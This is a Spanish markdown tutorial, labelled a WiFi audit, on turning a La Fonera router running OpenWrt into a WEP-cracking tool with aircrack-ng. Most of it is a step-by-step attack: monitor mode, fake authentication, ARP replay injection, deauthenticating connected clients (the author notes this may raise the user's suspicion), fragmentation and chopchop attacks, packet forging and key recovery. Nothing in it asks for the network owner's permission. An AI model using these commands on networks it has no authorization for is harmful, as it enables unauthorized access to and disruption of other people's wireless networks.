# Auditoría WiFi con OpenWrt y La Fonera

Pasos para poder usar [La Fonera](http://wiki.fon.com/wiki/La_Fonera) con el firmware [OpenWrt](http://kamikaze.openwrt.org/) KAMIKAZE 7.09 como herramienta de auditoría WiFi.

Este manual es para auditoría WEP. Para redes WPA consultar:

- <http://aircrack-ng.org/doku.php?id=aircrack-ng#wpa>
- <http://aircrack-ng.org/doku.php?id=cracking_wpa>
- <http://fonerahacks.com/index.php/Tutorials-and-Guides/Aircrack-Tips-and-Tricks.html> (parte del final)

[Licencia](LICENCIA.md)


## PASO 0: Restablecer configuración por defecto e instalar programas necesarios

Para restablecer la  configuración que viene por defecto en OpenWrt KAMIKAZE 7.09 dejar los siguientes archivos con este aspecto:

### /etc/config/network
	config interface loopback
		option ifname   lo
		option proto    static
		option ipaddr   127.0.0.1
		option netmask  255.0.0.0

	config interface lan
		option ifname   eth0
		option type     bridge
		option proto    static
		option ipaddr   192.168.0.1
		option netmask  255.255.255.0

	config interface wan
		option ifname   ath0
		option proto    dhcp

### /etc/config/wireless
	config wifi-device  wifi0
		option type     atheros
		option disabled 0

	config wifi-iface
		option device   wifi0
		option mode     sta
		option ssid     Fonera
		option encryption none

Para instalar paquetes necesarios para la auditoría

	opkg install aircrack-ng

Como el espacio de la Fonera es limitado, para guardar las capturas de los paquetes vamos a necesitar montar una unidad de red de un ordenador externo.

Para instalar paquetes necesarios para montar una unidad de red NFS (Linux)

	opkg install kmod-fs-nfs

Para instalar paquetes necesarios para montar una unidad de red SAMBA/CIFS (Windows y/o Linux)

	opkg install kmod-fs-cifs

## PASO 1: Elegir la red objetivo

Desactivar el modo "Managed" de la interfaz Wifi...

	wlanconfig ath0 destroy

_(también se podría haber hecho usando las herramientas de aircrack-ng:_ `airmon-ng stop ath0`_)_

... y activar el modo monitor

	wlanconfig ath0 create wlandev wifi0 wlanmode monitor

_(también se podría haber hecho usando las herramientas de aircrack-ng pero a mi ni me funciona:_ `airmon-ng start wifi0`_)_

Para ver todas las redes al alcance

	airodump-ng ath0

Para filtrar y mostrar solo las redes WEP usar

	airodump-ng ath0 -t WEP

De la lista, elegir una red objetivo y fijarse en el ESSID, el BSSID (la MAC del AP) y el canal. Además necesitarás saber la MAC de la tarjeta WiFi de la Fonera. En mi caso estos son los datos:

 En mi caso los datos son los siguientes:

	ESSID: WLAN_XX
	BSSID: AA:BB:CC:DD:FF:FF
	Canal: 1
	MAC de la Fonera: 00:11:22:33:44:55

__Reemplaza a lo largo del manual estos datos por los tuyos propios.__

Una vez conocidos los datos, dejar en una consola ejecutandose aireplay-ng el canal de la red objetivo:

	airodump-ng ath0 --channel 1

Esta consola nos informará en todo momento de los clientes conectados a la red objetivo.


## PASO 2: Capturar

Abrir una nueva consola y crear el punto de montaje para las capturas

	mkdir -p /mnt/capturas

Montar la unidad de red en dicho punto (el primer comando es para NFS y el segundo para SAMBA/CIFS)

	mount 192.168.0.5:/share /mnt/capturas -t nfs -o nolock
	mount //192.168.0.5/share /mnt/capturas -o username=usuario,password=contrasena

Comenzamos a capturar

	cd /mnt/capturas
	airodump-ng --channel 1 --bssid AA:BB:CC:DD:FF:FF -w output ath0

Esta consola nos informará en todo del estado de la captura.


## PASO 3: Asociarnos con el AP objetivo

Para poder inyectar paquetes antes tenemos que asociarnos con el AP. Usaremos aireplay para hacer una una autenticación falsa.

Desde otra consola ejecutar

	aireplay-ng -1 0 -e WLAN_XX -a AA:BB:CC:DD:FF:FF -h 00:11:22:33:44:55 ath0

Si tiene éxito nos sale un mensaje __"Association successful :-)"__ y además podemos ver que en la consola en la que se está ejecutando airodump aparece nuestra MAC como conectada.

Si no tiene éxito reintentar con este comando

	aireplay-ng -1 6000 -o 1 -q 90 -e WLAN_XX -a AA:BB:CC:DD:FF:FF -h 00:11:22:33:44:55 ath0

## PASO 4: Inyectar paquetes

Activar el modo de inyección de paquetes ARP en la misma consola que el paso anterior

	aireplay-ng -3 -b AA:BB:CC:DD:FF:FF -h 00:11:22:33:44:55 ath0

Estando en este modo, tan pronto como se reciba un paquete ARP, aireplay lo repetirá y el campo DATA de airodump aumentará.

Si existe in cliente conectado (a parte de nosotros) en el AP objetivo, podemos desconectarlo para forzar que se produzca el paquete ARP (lo cual puede levantar sospechas si el usuario cliente está delante del ordenador). Para desconectar a un cliente existente, desde otra consola ejecutar

	aireplay-ng -0 5 -a AA:BB:CC:DD:FF:FF -c MAC_DEL_CLIENTE ath0


Si no existe un cliente conectado hay dos ataques más que podemos usar para provocar el paquete ARP: el de "fragmentación" y el "chopchop". Con que uno solo de los dos tenga éxito es suficiente.

Para hacer el ataque de fragmentación:
	aireplay-ng -5 -b AA:BB:CC:DD:FF:FF -h 00:11:22:33:44:55 ath0

Para hacer el ataque de chopchop:
	aireplay-ng -4 -b AA:BB:CC:DD:FF:FF -h 00:11:22:33:44:55 ath0

La salida de cualquiera de los dos ataques, si tienen éxito, será un archivo "fragment-date.xor" que usaremos con el comando packetforge-ng para generar un archivo "arp-request" que contiene el paquete ARP:

	packetforge-ng -0 -a AA:BB:CC:DD:FF:FF -h 00:11:22:33:44:55 -k 255.255.255.255 -l 255.255.255.255 -y fragment-date.xor -w arp-request

Una vez tenemos el  archivo "arp-request" lo reinyectamos al AP con aireplay-ng:

	aireplay-ng -2 -r arp-request ath0

Cuando el campo DATA llegue a 40.000 paquetes (aunque se recomienda esperar a 250.000 para aumentar las posibilidades de éxito) detener la captura.

## PASO 5: Averiguar la clave

Una vez tenemos la captura, desde un ordenador rápido ejecutar aircrack para buscar la clave:

Para el método PTW (recomendado)

	aircrack-ng -z output*.cap

__(Un comando equivalente sería:_ `aircrack-ptw  output*.cap`_)_

Si no la obtenemos podemos usar el método FMS/Korek que es más lento

	aircrack-ng output*.cap

__NOTA:__ Para este método podríamos haber pasado la opción -i a airodump-ng en el PASO 2 y así las capturas ocupan menos espacio en disco pero dejan de ser válidas para usar el método PTW o para auditar WPA/WPA2.
